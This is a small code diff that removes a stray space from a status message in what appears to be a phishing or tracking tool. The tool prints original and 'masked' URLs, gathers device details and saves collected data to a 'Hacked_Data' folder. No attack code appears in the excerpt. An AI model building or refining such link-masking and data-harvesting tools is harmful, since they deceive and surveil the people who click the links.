@@ -453,7 +453,7 @@ def alert_panel(url = "", mask = ""):
     if not (url == ""):
         print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m URL : \033[37m"+url)
         if not (mask == ""):
-            print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m Masked URL : \033[37m "+masked_url)
+            print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m Masked URL : \033[37m"+masked_url)
     if (menu.method == "about_device"):
         print("\n\033[92m\033[94m[\033[37m+\033[94m]\033[92m Use a VPN To Get Extra Device Informations...")
     print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m All Your Data is Saved In \033[37mHacked_Data \033[92mFolder")
